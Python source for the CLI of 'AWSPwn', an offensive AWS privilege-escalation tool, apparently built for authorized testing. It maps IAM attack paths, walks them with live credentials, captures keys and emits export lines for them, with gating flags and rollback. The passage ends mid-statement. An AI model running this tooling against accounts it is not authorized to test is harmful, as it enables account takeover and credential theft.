#!/usr/bin/env python3
"""AWSPwn - AWS attack-path automation.

Mirrors ADScout's CLI shape (set_defaults(func=...) + int exit codes) and
ADPwn's error handling (KeyboardInterrupt -> 130, generic -> AWSPWN_DEBUG
traceback -> 1). The boto3-dependent commands (enum / analyze / whoami / pwn)
lazy-import the AWS layer so the offline commands (edges / info / load / path /
reachable / report / loot) work with nothing installed but the package itself.

Phases 1+2 (read-only) implemented:
    enum load path reachable analyze whoami info edges report loot exploit
Phase 3 (exploitation) implemented:
    pwn      - automated path walk with credential propagation + mutation ledger
    roam     - interactive pivot loop; re-collect from each new vantage (low-read)
    console  - trade CLI creds for a console sign-in URL (federation)
    rollback - replay the mutation ledger LIFO to undo a pwn run
"""

from __future__ import annotations

import argparse
import os
import sys
from typing import Optional

from . import __version__
from .abuse import edges_by_category
from .colors import C, _bold, _color, _dim, banner, disable_color, separator
from .graph import AttackGraph
from .models import Node
from .report import (
    render_captured,
    render_edge_catalogue,
    render_edge_info,
    render_findings,
    render_high_value,
    render_json,
    render_loot,
    render_paths,
    render_stats,
)
from .state import (
    CAPTURED_FILENAME,
    GRAPH_FILENAME,
    State,
    load_captured_creds,
    load_graph,
    load_state,
    loot_dir_path,
    save_graph,
    save_state,
    state_path,
    write_private_file,
)


# ─── Shared flags ───────────────────────────────────────────────────────────


def _auth_parent() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(add_help=False)
    p.add_argument("--profile", default=os.environ.get("AWS_PROFILE", ""),
                   help="AWS named profile (env: $AWS_PROFILE)")
    p.add_argument("--region", default=os.environ.get("AWS_REGION") or os.environ.get("AWS_DEFAULT_REGION", ""),
                   help="Default region (env: $AWS_REGION)")
    p.add_argument("--access-key", default="", help="AWS access key id (or env: $AWS_ACCESS_KEY_ID)")
    p.add_argument("--secret-key", default="", help="AWS secret access key (or env: $AWS_SECRET_ACCESS_KEY)")
    p.add_argument("--session-token", default="", help="AWS session token (or env: $AWS_SESSION_TOKEN)")
    p.add_argument("--loot-dir", default="./awspwn-loot", help="Directory for state.json / graph.json / artifacts")
    p.add_argument("--data", help="Path to a graph.json / state.json to load (offline analysis)")
    p.add_argument("--no-cache", "--fresh", dest="no_cache", action="store_true",
                   help="Ignore the saved graph.json in the loot dir and re-enumerate from AWS (needs creds)")
    p.add_argument("--max-depth", type=int, default=12, help="Max path depth (default: 12)")
    p.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose output (show INFO findings, per-enumerator progress)")
    return p


_MUTATING_COMMANDS = {"pwn", "roam", "console", "rollback"}

# Blast-radius colours for the roam menu, keyed by BlastRadius.value (kept as
# strings so this module need not import the enum just for a colour map).
_ROAM_BLAST = {}


def _init_roam_blast():
    from .models import BlastRadius
    _ROAM_BLAST.update({
        BlastRadius.READ: C.GREEN,
        BlastRadius.MUTATE: C.YELLOW,
        BlastRadius.DESTRUCTIVE: C.RED,
        BlastRadius.EXTERNAL_EXPOSURE: C.MAGENTA,
    })


_init_roam_blast()


def _banner_once(args: argparse.Namespace, subtitle: str = "") -> None:
    if getattr(args, "no_color", False):
        disable_color()
    print(banner())
    descriptor = (
        "phase-3 exploitation - mutates the account"
        if getattr(args, "command", "") in _MUTATING_COMMANDS
        else "read-only recon + attack-path analysis"
    )
    print(f"  {_bold('version')} {_color(__version__, C.CYAN)}   {_color(descriptor, C.DIM)}")
    if subtitle:
        print(f"  {_color(subtitle, C.DIM)}")
    print()


# ─── Graph loading + node resolution ────────────────────────────────────────


def _graph_from_source(args: argparse.Namespace) -> tuple[AttackGraph, dict]:
    """Load a graph from --data, else from the loot dir's graph.json."""
    src = getattr(args, "data", None)
    if not src:
        candidate = loot_dir_path(getattr(args, "loot_dir", None)) / GRAPH_FILENAME
        if candidate.exists():
            src = str(candidate)
    if not src or not os.path.exists(src):
        raise RuntimeError(
            f"No graph found. Run `awspwn enum` first, or pass --data <graph.json>. "
            f"(looked for {src or 'nothing'})"
        )
    nodes, edges, meta = load_graph(src)
    return AttackGraph(nodes, edges), meta


def _has_credentials(args: argparse.Namespace) -> bool:
    return bool(
        getattr(args, "profile", "")
        or (getattr(args, "access_key", "") and getattr(args, "secret_key", ""))
        or os.environ.get("AWS_PROFILE")
        or (os.environ.get("AWS_ACCESS_KEY_ID") and os.environ.get("AWS_SECRET_ACCESS_KEY"))
    )


def _graph_or_enum(args: argparse.Namespace) -> tuple[AttackGraph, dict]:
    """Load a saved graph if one exists; otherwise, if credentials are present,
    collect it now by running enum. This makes `exploit`/`path`/`reachable`/`pwn`
    work with just credentials - no separate `enum` step required.

    `--no-cache` / `--fresh` skips the saved <loot-dir>/graph.json and
    re-enumerates from AWS; an explicit `--data` graph file is still honored."""
    src = getattr(args, "data", None)
    if src:
        return _graph_from_source(args)  # an explicit graph file always wins
    no_cache = getattr(args, "no_cache", False)
    candidate = loot_dir_path(getattr(args, "loot_dir", None)) / GRAPH_FILENAME
    if candidate.exists() and not no_cache:
        return _graph_from_source(args)
    if not _has_credentials(args):
        if no_cache and candidate.exists():
            raise RuntimeError(
                "--no-cache needs credentials to re-enumerate (a saved graph.json "
                "exists but no creds and no --data were given). Pass --profile or "
                "keys, or drop --no-cache to use the saved graph."
            )
        return _graph_from_source(args)  # raises the helpful "no graph" error
    reason = "--no-cache" if (no_cache and candidate.exists()) else "no saved graph"
    print(f"  {_color('[*]', C.CYAN)} {reason} - collecting fresh (enum)…\n")
    state = _run_enum(args, phase2=not getattr(args, "iam_only", False))
    graph = AttackGraph(state.node_map(), state.edges)
    print()
    return graph, {"account": state.origin_account, "caller_arn": state.caller_arn}


def _resolve_node(graph: AttackGraph, identifier: str, label: str) -> Node:
    """Exact -> fuzzy -> numbered 'Did you mean' prompt, like ADPwn."""
    node = graph.get_node(identifier)
    if node:
        return node
    matches = graph.search_nodes(identifier, limit=15)
    if not matches:
        print(f"  {_color('[!]', C.RED)} No {label} node matches '{identifier}'")
        sys.exit(1)
    if len(matches) == 1:
        return matches[0]
    print(f"  {_color('[?]', C.YELLOW)} Multiple matches for '{identifier}' - pick one:")
    for i, m in enumerate(matches, 1):
        print(f"    {i:2}. {m.label}  {_color(m.kind.value, C.DIM)}")
    try:
        choice = int(input("  > ").strip())
        return matches[choice - 1]
    except (ValueError, IndexError, KeyboardInterrupt):
        print(f"  {_color('[!]', C.RED)} Invalid selection")
        sys.exit(1)


# ─── boto3-backed commands (lazy imports) ───────────────────────────────────


def _build_enumerators(phase2: bool):
    """Instantiate the available enumerators. Phase-2 ones are added when present."""
    from .enum.iam import IamEnumerator
    from .enum.sts import StsEnumerator

    enumerators = [StsEnumerator(), IamEnumerator()]
    if phase2:
        # Phase-2 enumerators - imported defensively so a partial checkout still runs.
        for modname, clsname in (
            ("s3", "S3Enumerator"),
            ("ec2", "Ec2Enumerator"),
            ("lambda_fn", "LambdaEnumerator"),
            ("secrets", "SecretsEnumerator"),
            ("rds", "RdsEnumerator"),
            ("dynamodb", "DynamoDbEnumerator"),
            ("compute_extra", "ComputeExtraEnumerator"),
            ("org", "OrgEnumerator"),
        ):
            try:
                mod = __import__(f"awspwn.enum.{modname}", fromlist=[clsname])
                enumerators.append(getattr(mod, clsname)())
            except (ImportError, AttributeError):
                continue
    return enumerators


def _canonical_caller(client) -> str:
    """The graph-node id for the connected identity - canonicalized so an
    assumed-role session's caller_arn resolves to its role node for pathfinding.
    An STS session ARN drops the role's IAM path, so for a role we recover the
    path-qualified ARN via GetRole (matching the node the STS/self resolver mints);
    otherwise caller_arn could point at a fabricated pathless ARN."""
    from .aws_client import resolve_graph_principal_id

    return resolve_graph_principal_id(client)


def _reset_state_if_foreign_account(state: State, client) -> State:
    """Top-level (`enum`/`analyze`) guard only: a loot dir built for a genuinely
    different STARTING account is a different engagement - start fresh rather than
    merge two unrelated accounts. This is NOT applied during `roam`/`collect_from`,
    where a cross-account pivot is expected and the graph legitimately spans
    accounts (nodes carry their own `account`)."""
    acct = client.identity.account
    if state.origin_account and state.origin_account != acct:
        print(f"  {_color('[!]', C.YELLOW)} loot dir holds account {state.origin_account}, "
              f"you are {acct} - starting a fresh graph")
        state = State()
    if not state.origin_account:
        state.origin_account = acct
    if not state.caller_arn:
        state.caller_arn = _canonical_caller(client)
    return state


def collect_from(
    client,
    state: State,
    graph: AttackGraph,
    args: argparse.Namespace,
    *,
    phase2: bool = True,
    log=None,
) -> "object":
    """Enumerate from THIS client's vantage and MERGE into the live graph+state.

    The unit of incremental collection: idempotent, account-additive, and safe to
    call once per identity as `roam` pivots. It never resets state (nodes are
    account-tagged, so the graph may span accounts). Correlation is re-run over
    the WHOLE merged graph, not just this vantage's slice, so a newly discovered
    principal gains edges to resources found earlier AND a newly discovered
    resource is correlated against principals found earlier. Findings/denials
    accumulate (deduped) and are attributed to the collecting vantage."""
    from .aws_client import canonical_principal_id
    from .enum.base import run_all
    from .enum.correlate import reconcile_resource_edges

    log = log or (lambda m: print(m))
    vantage = canonical_principal_id(client.identity)

    regions = [args.region] if getattr(args, "region", "") else client.active_regions()
    if phase2:
        log(f"  {_color('[*]', C.CYAN)} sweeping {len(regions)} region(s) as {_bold(vantage)}")
    enumerators = _build_enumerators(phase2)
    log(f"  {_color('[*]', C.CYAN)} running {len(enumerators)} enumerator(s)…\n")
    result = run_all(client, enumerators, regions=regions, verbose=getattr(args, "verbose", False))

    n0, e0 = len(state.nodes), len(state.edges)
    for n in result.nodes:
        state.add_node(n)
        graph.add_node(n)
    for e in result.edges:
        state.add_edge(e)
        graph.add_edge(e)
    # Union reconciliation over the whole merged graph: mints new-principal×old-
    # resource and old-principal×new-resource edges, UPGRADES a legacy conditional
    # edge once structured grants confirm it, and REMOVES a correlation edge that
    # newer (structured) permissions now deny. Applied to both stores in lockstep.
    upserts, removals = reconcile_resource_edges(state.nodes, state.edges)
    for e in upserts:
        state.add_edge(e)
        graph.add_edge(e)
    for src, tgt, kind in removals:
        state.remove_edge(src, tgt, kind)
        graph.remove_edge(src, tgt, kind)

    # Opportunistic higher-fidelity refinement: if the caller holds
    # iam:SimulatePrincipalPolicy, confirm/retract the CURRENT vantage's own
    # candidate edges via AWS's evaluator. No-op when simulation is unavailable.
    from .aws_client import resolve_graph_principal_id
    from .policy.simulate import refine_edges_with_simulation

    sim_arn = resolve_graph_principal_id(client)
    pairs = [
        (e, graph.nodes.get(e.target_id))
        for e in graph.outgoing_edges(sim_arn)
        if graph.nodes.get(e.target_id) is not None
    ]
    if pairs:
        sim_up, sim_rm = refine_edges_with_simulation(client, sim_arn, pairs, log=lambda m: log(f"  {_dim(m)}"))
        for e in sim_up:
            state.add_edge(e)
            graph.add_edge(e)
        for src, tgt, kind in sim_rm:
            state.remove_edge(src, tgt, kind)
            graph.remove_edge(src, tgt, kind)

    # Accumulate findings/denials rather than replacing them. Stamp the vantage on
    # this collection's enum findings (denials with no subject arn) so per-vantage
    # denial stays attributable and de-duplicable across recollections.
    for f in result.findings:
        if f.category == "enum" and not f.arn:
            f.arn = vantage
        state.add_finding(f)
    state.denied = sorted(set(state.denied) | set(result.denied))

    save_state(state, args.loot_dir)
    save_graph(state, args.loot_dir)
    log(f"  {_color('[+]', C.GREEN)} collected from {_bold(vantage)}: "
        f"+{len(state.nodes) - n0} node(s), +{len(state.edges) - e0} edge(s)")
    return result


def _run_enum(args: argparse.Namespace, phase2: bool) -> State:
    from .aws_client import connect

    client = connect(args)
    # Cache the connected client so a follow-on command in the same process
    # (e.g. `pwn` collecting the graph via enum) can reuse it instead of
    # re-authenticating.
    setattr(args, "_live_client", client)
    setattr(args, "_collected", True)  # a fresh collection just ran (vs. cache load)
    print(f"  {_color('[+]', C.GREEN)} authenticated as {_bold(client.identity.arn)}")
    print(f"  {_color('[*]', C.CYAN)} account {client.identity.account}")

    state = load_state(args.loot_dir)
    state = _reset_state_if_foreign_account(state, client)
    graph = AttackGraph(state.node_map(), state.edges)
    collect_from(client, state, graph, args, phase2=phase2)
    return state


def cmd_enum(args: argparse.Namespace) -> int:
    _banner_once(args, "enumerate identities + resources into an attack graph")
    state = _run_enum(args, phase2=not getattr(args, "iam_only", False))
    graph = AttackGraph(state.node_map(), state.edges)
    print(render_stats(graph))
    print()
    print(render_high_value(graph))
    print()
    print(render_findings(state.findings, verbose=getattr(args, "verbose", False)))
    print(f"  {_color('[*]', C.CYAN)} state → {state_path(args.loot_dir)}")
    print(f"  {_color('[*]', C.CYAN)} graph → {loot_dir_path(args.loot_dir) / GRAPH_FILENAME}")
    return 0


def cmd_whoami(args: argparse.Namespace) -> int:
    from .aws_client import connect

    _banner_once(args)
    client = connect(args)
    ident = client.identity
    print(f"  {_bold('ARN')}      {ident.arn}")
    print(f"  {_bold('Account')}  {ident.account}")
    print(f"  {_bold('UserId')}   {ident.user_id}")
    print(f"  {_bold('Source')}   {ident.source}")
    print(f"  {_bold('Region')}   {ident.region}")
    return 0


def cmd_analyze(args: argparse.Namespace) -> int:
    _banner_once(args, "enumerate, then discover every path to admin")
    state = _run_enum(args, phase2=not getattr(args, "iam_only", False))
    graph = AttackGraph(state.node_map(), state.edges)

    print(render_stats(graph))
    print()
    print(render_high_value(graph))
    print()

    # Path discovery: from the caller to every admin goal / high-value target.
    caller = graph.get_node(state.caller_arn)
    goals = [n for n in graph.nodes.values() if n.properties.get("synthetic_goal")]
    goals += [n for n in graph.find_high_value_targets() if not n.properties.get("synthetic_goal")]

    print(_color("── Attack paths from caller ", C.CYAN) + separator())
    if not caller:
        print(_color("  Caller not found in graph.", C.YELLOW))
    else:
        found_paths = []
        seen_signatures: set = set()
        for goal in goals:
            if goal.object_id == caller.object_id:
                continue
            path = graph.find_shortest_path(caller.object_id, goal.object_id, max_depth=args.max_depth)
            if not path:
                continue
            # Dedup paths that share the same node/edge sequence.
            sig = tuple((e.source_id, e.kind, e.target_id) for e in path.edges)
            if sig in seen_signatures:
                continue
            seen_signatures.add(sig)
            found_paths.append(path)
        found_paths.sort(key=lambda p: (p.cost, p.length))
        if found_paths:
            print(render_paths(found_paths))
        else:
            print(_color("  No escalation path from the caller to a high-value target.", C.YELLOW))
    print()
    print(render_findings(state.findings, verbose=getattr(args, "verbose", False)))
    print(f"  {_color('[*]', C.CYAN)} state → {state_path(args.loot_dir)}")
    return 0


# ─── Offline commands ───────────────────────────────────────────────────────


def cmd_load(args: argparse.Namespace) -> int:
    _banner_once(args)
    graph, meta = _graph_from_source(args)
    if meta.get("account"):
        print(f"  {_color('[*]', C.CYAN)} account {meta['account']}  caller {meta.get('caller_arn','')}")
    print(render_stats(graph))
    print()
    print(render_high_value(graph))
    return 0


def cmd_path(args: argparse.Namespace) -> int:
    _banner_once(args)
    graph, _ = _graph_or_enum(args)
    source = _resolve_node(graph, args.source, "source")
    target = _resolve_node(graph, args.target, "target")
    print(f"  {_bold('source')} {source.label}  {_color('→', C.DIM)}  {_bold('target')} {target.label}\n")
    if getattr(args, "all_paths", False):
        paths = graph.find_all_paths(source.object_id, target.object_id,
                                     max_depth=args.max_depth, max_paths=getattr(args, "max_paths", 10))
        print(render_paths(paths))
    else:
        path = graph.find_shortest_path(source.object_id, target.object_id, max_depth=args.max_depth)
        print(render_paths([path] if path else []))
    return 0


def cmd_reachable(args: argparse.Namespace) -> int:
    _banner_once(args)
    graph, _ = _graph_or_enum(args)
    source = _resolve_node(graph, args.source, "source")
    reach = graph.reachable_from(source.object_id, max_depth=args.max_depth)
    print(f"  {_bold(source.label)} can reach {_color(str(len(reach)), C.CYAN)} node(s):\n")
    rows = sorted(reach.items(), key=lambda kv: kv[1].cost)
    for node_id, path in rows:
        node = graph.nodes.get(node_id)
        if not node:
            continue
        star = _color("★", C.YELLOW) + " " if graph.is_high_value(node) else "  "
        print(f"  {star}{node.label:40} {_color(node.kind.value, C.DIM)}  "
              f"{_color(f'cost {path.cost}', C.DIM)}  ({path.length} hop)")
    return 0


def cmd_info(args: argparse.Namespace) -> int:
    _banner_once(args)
    print(render_edge_info(args.edge))
    return 0


def cmd_edges(args: argparse.Namespace) -> int:
    _banner_once(args)
    print(render_edge_catalogue(edges_by_category()))
    return 0


def cmd_loot(args: argparse.Namespace) -> int:
    captured = load_captured_creds(args.loot_dir)
    export_sel = getattr(args, "export", None)
    if export_sel is not None:  # --export: emit only eval-able lines (see helper)
        return _emit_export(captured, export_sel)
    state = load_state(args.loot_dir)
    if not state.nodes and not state.findings and not captured:
        print(f"  {_color('[!]', C.YELLOW)} No state at {state_path(args.loot_dir)} - run `awspwn enum` first.")
        return 1
    print(render_loot(state))
    if captured:
        print()
        print(render_captured(captured, show_secrets=getattr(args, "show_secrets", False),
                              current_account=state.origin_account))
    return 0


def _print_export_choices(creds: list) -> None:
    for c in creds:
        label = c.get("target_name") or c.get("target_arn") or "?"
        print(f"#   --export {label}   ({c.get('kind', '?')}, {c.get('access_key', '')})", file=sys.stderr)


def _emit_export(captured: list, selector: str) -> int:
    """Print eval-able `export AWS_*` lines for ONE captured credential to stdout;
    prompts and the choice list go to stderr, so `eval "$(awspwn loot --export
    NAME)"` loads exactly one identity and nothing else. Selecting a key with no
    session token also unsets AWS_SESSION_TOKEN so a stale one cannot shadow it."""
    if not captured:
        print("# awspwn: no captured credentials in this loot dir", file=sys.stderr)
        return 1
    matches = captured
    if selector:
        s = selector.lower()
        matches = [
            c for c in captured
            if s in (f"{c.get('target_name', '')} {c.get('target_arn', '')} "
                     f"{c.get('kind', '')} {c.get('access_key', '')}").lower()
        ]
    if not matches:
        print(f"# awspwn: no captured credential matches '{selector}'. Available:", file=sys.stderr)
        _print_export_choices(captured)
        return 1
    if len(matches) > 1:
        print("# awspwn: multiple credentials match; narrow it, e.g. --export <name>:", file=sys.stderr)
        _print_export_choices(matches)
        return 1
    c = matches[0]
    if not c.get("access_key") or not c.get("secret_key"):
        print("# awspwn: selected entry has no usable key pair", file=sys.stderr)
        return 1
    print(f"export AWS_ACCESS_KEY_ID={c['access_key']}")
    print(f"export AWS_SECRET_ACCESS_KEY={c['secret_key']}")
    if c.get("session_token"):
        print(f"export AWS_SESSION_TOKEN={c['session_token']}")
    else:
        print("unset AWS_SESSION_TOKEN")
    label = c.get("target_name") or c.get("target_arn") or "?"
    arn_parts = c.get("target_arn", "").split(":")
    acct = c.get("account") or (arn_parts[4] if len(arn_parts) > 4 else "?")
    ephemeral = " [session token - ephemeral; re-capture if expired]" if c.get("session_token") else ""
    print(f"# awspwn: loaded {c.get('kind', '?')} for {label} (account {acct}){ephemeral}", file=sys.stderr)
    return 0


def cmd_report(args: argparse.Namespace) -> int:
    state = load_state(args.loot_dir)
    if getattr(args, "format", "terminal") == "json":
        text = render_json(state)
        if getattr(args, "output", None):
            write_private_file(args.output, text)  # 0600 - contains account topology
            print(f"  {_color('[+]', C.GREEN)} JSON report (0600) → {args.output}")
        else:
            print(text)
        return 0
    _banner_once(args)
    graph = AttackGraph(state.node_map(), state.edges)
    print(render_stats(graph))
    print()
    print(render_high_value(graph))
    print()
    print(render_findings(state.findings, verbose=getattr(args, "verbose", False)))
    return 0


def cmd_exploit(args: argparse.Namespace) -> int:
    from .exploit import candidate_paths, execute_path, render_runbook

    _banner_once(args, "choose a path and walk it")
    graph, meta = _graph_or_enum(args)

    src_id = getattr(args, "source", None) or meta.get("caller_arn", "")
    if not src_id:
        print(f"  {_color('[!]', C.RED)} No source given and no caller in the graph. Pass a source ARN/name.")
        return 1
    source = _resolve_node(graph, src_id, "source")

    account = meta.get("account", "")
    region = getattr(args, "region", "") or "us-east-1"

    # Build the candidate path list (to admin + each high-value target).
    if getattr(args, "target", None):
        target = _resolve_node(graph, args.target, "target")
        paths = graph.find_all_paths(source.object_id, target.object_id,
                                     max_depth=args.max_depth, max_paths=15)
        # dedup + cost sort
        seen, uniq = set(), []
        for p in sorted(paths, key=lambda p: (p.cost, p.length)):
            sig = tuple((e.source_id, e.kind, e.target_id) for e in p.edges)
            if sig not in seen:
                seen.add(sig)
                uniq.append(p)
        paths = uniq
    else:
        paths = candidate_paths(graph, source.object_id, args.max_depth)

    if not paths:
        print(f"  {_color('[!]', C.YELLOW)} No path found from {source.label}.")
        return 1

    # ── Interactive selection ──
    print(f"  {_bold('Paths from')} {source.label}:\n")
    for i, p in enumerate(paths, 1):
        dest = p.nodes[-1].label
        chain = " → ".join(e.kind for e in p.edges)
        print(f"    {_color(str(i), C.CYAN)}. (cost {p.cost}, {p.length} hop) → {_bold(dest)}")
        print(_dim(f"        {chain}"))
    print()

    if getattr(args, "yes", False) or len(paths) == 1:
        choice = paths[0]
        print(f"  {_color('[*]', C.CYAN)} selected path #1")
    else:
        try:
            sel = input(f"  Select a path [1-{len(paths)}] (q to quit): ").strip()
        except (EOFError, KeyboardInterrupt):
            return 130
        if sel.lower() == "q" or not sel:
            return 0
        try:
            choice = paths[int(sel) - 1]
        except (ValueError, IndexError):
            print(f"  {_color('[!]', C.RED)} Invalid selection")
            return 1

    print()
    if not getattr(args, "execute", False):
        print(render_runbook(choice, account, region))
        print()
        print(_dim("  # re-run with --execute to walk the identity hops in-process (boto3) "
                   "and be prompted before each mutating step."))
        return 0

    # ── Execute ──
    from .aws_client import connect
    client = connect(args)
    if client.identity.arn != source.object_id and not getattr(args, "yes", False):
        print(f"  {_color('[!]', C.YELLOW)} caller is {client.identity.arn}, "
              f"path starts at {source.object_id} - continuing anyway.")
    execute_path(choice, client, account, region, assume_yes=getattr(args, "yes", False))
    return 0


def _select_paths(graph: AttackGraph, source: Node, args: argparse.Namespace):
    """Candidate paths from source to admin + high-value targets (or to an
    explicit --target), deduped and cost-sorted."""
    from .exploit import candidate_paths

    if getattr(args, "target", None):
        target = _resolve_node(graph, args.target, "target")
        raw = graph.find_all_paths(source.object_id, target.object_id,
                                   max_depth=args.max_depth, max_paths=15)
        seen, uniq = set(), []
        for p in sorted(raw, key=lambda p: (p.cost, p.length)):
            sig = tuple((e.source_id, e.kind, e.target_id) for e in p.edges)
            if sig not in seen:
                seen.add(sig)
                uniq.append(p)
        return uniq
    return candidate_paths(graph, source.object_id, args.max_depth)


def _choose_path(paths, args: argparse.Namespace, source: Node):
    """Return (chosen_path, exit_code). When a path is chosen, exit_code is 0 and
    should be ignored; when None, exit_code distinguishes a deliberate quit (0)
    from a couldn't-select condition (non-zero) so `pwn --execute` in a pipe does
    not look like a silent success."""
    print(f"  {_bold('Paths from')} {source.label}:\n")
    for i, p in enumerate(paths, 1):
        chain = " → ".join(e.kind for e in p.edges)
        print(f"    {_color(str(i), C.CYAN)}. (cost {p.cost}, {p.length} hop) → {_bold(p.nodes[-1].label)}")
        print(_dim(f"        {chain}"))
    print()
    if getattr(args, "yes", False) or len(paths) == 1:
        print(f"  {_color('[*]', C.CYAN)} selected path #1")
        return paths[0], 0
    if not sys.stdin.isatty():
        print(f"  {_color('[!]', C.YELLOW)} {len(paths)} candidate paths and no TTY to choose - "
              f"refusing to auto-select. Pass -y to take the cheapest, or a specific target.")
        return None, 2
    try:
        sel = input(f"  Select a path [1-{len(paths)}] (q to quit): ").strip()
    except (EOFError, KeyboardInterrupt):
        return None, 130
    if sel.lower() == "q" or not sel:
        return None, 0
    try:
        return paths[int(sel) - 1], 0
    except (ValueError, IndexError):
        print(f"  {_color('[!]', C.RED)} Invalid selection")
        return None, 1


def cmd_pwn(args: argparse.Namespace) -> int:
    from .aws_client import connect
    from .rollback import rollback as do_rollback
    from .strategy import Gates, PwnEngine, render_plan

    _banner_once(args, "automated exploitation - credential propagation + rollback ledger")
    graph, meta = _graph_or_enum(args)

    src_id = getattr(args, "source", None) or meta.get("caller_arn", "")
    if not src_id:
        print(f"  {_color('[!]', C.RED)} No source given and no caller in the graph. Pass a source ARN/name.")
        return 1
    source = _resolve_node(graph, src_id, "source")
    account = meta.get("account", "")
    region = getattr(args, "region", "") or "us-east-1"

    paths = _select_paths(graph, source, args)
    if not paths:
        print(f"  {_color('[!]', C.YELLOW)} No path found from {source.label}.")
        return 1

    choice, choose_code = _choose_path(paths, args, source)
    if choice is None:
        return choose_code

    gates = Gates(
        execute=getattr(args, "execute", False),
        allow_destructive=getattr(args, "allow_destructive", False),
        allow_external=getattr(args, "allow_external", False),
        allow_orphan=getattr(args, "allow_orphan", False),
    )

    print()
    if not gates.execute:
        print(render_plan(choice, gates))
        print()
        print(_dim("  # nothing was executed. Re-run with --execute to walk the path in-process"))
        print(_dim("  # (boto3, real credential propagation) with every mutating step gated by blast radius"))
        print(_dim("  #   --allow-destructive / --allow-external / --allow-orphan open the riskier classes"))
        return 0

    # ── Execute ──
    # Reuse the client from a live enum collection (if _graph_or_enum ran one)
    # rather than authenticating a second time.
    client = getattr(args, "_live_client", None) or connect(args)
    if client.identity.arn != source.object_id:
        print(f"  {_color('[!]', C.YELLOW)} caller is {client.identity.arn}, "
              f"path starts at {source.object_id} - continuing as the caller.")
    state = load_state(args.loot_dir)
    if not state.origin_account:
        state.origin_account = account
    if not state.caller_arn:
        state.caller_arn = _canonical_caller(client)

    engine = PwnEngine(state, graph, gates, account=account, region=region,
                       loot_dir=args.loot_dir, session_name=getattr(args, "session_name", "awspwn"))
    report = engine.walk(choice, client)

    print()
    print(separator())
    status = _color("REACHED GOAL", C.GREEN) if report.reached_goal else _color("did not reach goal", C.YELLOW)
    print(f"  {_bold('Result')}: {status}   {report.hops_done}/{report.hops_total} hop(s)   "
          f"final identity: {_bold(report.final_arn)}")
    print(f"  {_bold('Mutations recorded')}: {report.mutations}  "
          f"({_color('awspwn rollback', C.CYAN)} to undo)")
    if report.captured:
        store = loot_dir_path(args.loot_dir) / CAPTURED_FILENAME
        print(f"  {_bold('Captured credentials')} {_dim(f'(secrets saved 0600 → {store})')}:")
        for ident in report.captured:
            akid = f"  key {ident.access_key}" if ident.access_key else ""
            print(f"    {_color('★', C.YELLOW)} {ident.arn or ident.name}  {_dim('(' + ident.source + ')')}{akid}")
    if report.loot:
        print(f"  {_bold('Loot reachable')}: " + ", ".join(report.loot[:12]))
    if report.blocked:
        print(f"  {_color('Blocked', C.YELLOW)}:")
        for b in report.blocked:
            print(f"    - {b}")
    if report.manual:
        print(f"  {_color('Manual steps needed', C.YELLOW)}:")
        for m in report.manual:
            print(f"    - {m}")

    cleanup = getattr(args, "cleanup", False)
    fail_rb = not report.reached_goal and getattr(args, "rollback_on_failure", False)
    if (cleanup or fail_rb) and state.mutations:
        # Undo as the furthest-propagated identity: after escalation it usually
        # holds the delete permissions the low-priv caller lacks (create-not-
        # delete privesc), so cleanup actually succeeds.
        rb_client = engine.final_client or client
        why = "--cleanup" if cleanup else "--rollback-on-failure"
        print()
        print(f"  {_color('[*]', C.CYAN)} {why}: undoing mutations as {_bold(rb_client.identity.arn)}")
        do_rollback(state, rb_client, args.loot_dir, log=lambda m: print(m))

    return 0 if report.reached_goal else 1


def _roam_hops(graph: AttackGraph, node_id: str):
    """Actionable one-hop options from `node_id`: abusable outgoing edges to a
    known node, sorted identity-changing / high-value first. Structural edges
    (MemberOf, ContainedIn) are not directly actionable and are skipped."""
    from .abuse import get_abuse_info
    from .strategy import ASSUME_EDGES

    hops = []
    for e in graph.outgoing_edges(node_id):
        info = get_abuse_info(e.kind)
        if info is None or not info.is_abusable:
            continue
        dst = graph.nodes.get(e.target_id)
        if dst is None:
            continue
        hops.append((e, dst, info))

    def _rank(item):
        e, dst, info = item
        identity = e.kind in ASSUME_EDGES or dst.is_principal
        goal = bool(dst.properties.get("synthetic_goal")) or graph.is_high_value(dst)
        return (not goal, not identity, e.kind)

    hops.sort(key=_rank)
    return hops


def cmd_roam(args: argparse.Namespace) -> int:
    """Interactive pivot loop: from the current identity, pick one actionable hop,
    execute exactly that hop, and - only if it changed identity - re-collect from
    the new vantage, then return to the menu. Reaching admin is a checkpoint, not
    an exit; only q / EOF / interrupt ends the loop."""
    from .aws_client import connect
    from .models import AttackPath
    from .strategy import Gates, PwnEngine, render_plan

    _banner_once(args, "interactive pivot loop - hop principal to principal (q to quit)")
    graph, meta = _graph_or_enum(args)

    src_id = getattr(args, "source", None) or meta.get("caller_arn", "")
    if not src_id:
        print(f"  {_color('[!]', C.RED)} No source given and no caller in the graph. Pass a source ARN/name.")
        return 1
    source = _resolve_node(graph, src_id, "source")
    account = meta.get("account", "")
    region = getattr(args, "region", "") or "us-east-1"

    gates = Gates(
        execute=getattr(args, "execute", False),
        allow_destructive=getattr(args, "allow_destructive", False),
        allow_external=getattr(args, "allow_external", False),
        allow_orphan=getattr(args, "allow_orphan", False),
    )

    state = load_state(args.loot_dir)
    if not state.origin_account:
        state.origin_account = account
    phase2 = not getattr(args, "iam_only", False)

    # Creds are only needed to actually walk hops. Plan mode explores the cached
    # graph (possibly an arbitrary source) without authenticating.
    current = getattr(args, "_live_client", None)
    if gates.execute:
        if current is None:
            current = connect(args)  # validates the live caller (whoami)
        # Refuse to execute another principal's edges with our credentials: an
        # explicit SOURCE must match who we actually are. (Plan mode may inspect
        # any source.)
        caller_id = _canonical_caller(current)
        if caller_id != source.object_id:
            print(f"  {_color('[!]', C.RED)} refusing to execute: caller is {caller_id}, "
                  f"but source is {source.object_id}. Roam --execute walks the caller's own edges "
                  f"(drop --execute to inspect this source in plan mode).")
            return 1
        # "Collect from vantage 1": if the graph came from cache rather than a
        # fresh collection, enumerate the current vantage before roaming so the
        # frontier reflects the live credentials.
        if not getattr(args, "_collected", False):
            print(_dim("  collecting the initial vantage…"))
            collect_from(current, state, graph, args, phase2=phase2)

    # The graph principal ID is tracked SEPARATELY from the live (possibly STS
    # session) ARN: pathfinding uses this id, creds live on `current`.
    current_node_id = source.object_id
    visited: set = {current_node_id}
    reached: set = set()
    completed: set = set()   # (src_id, kind, dst_id) of finished MUTATING hops
    hop_count = 0

    engine = PwnEngine(state, graph, gates, account=account, region=region,
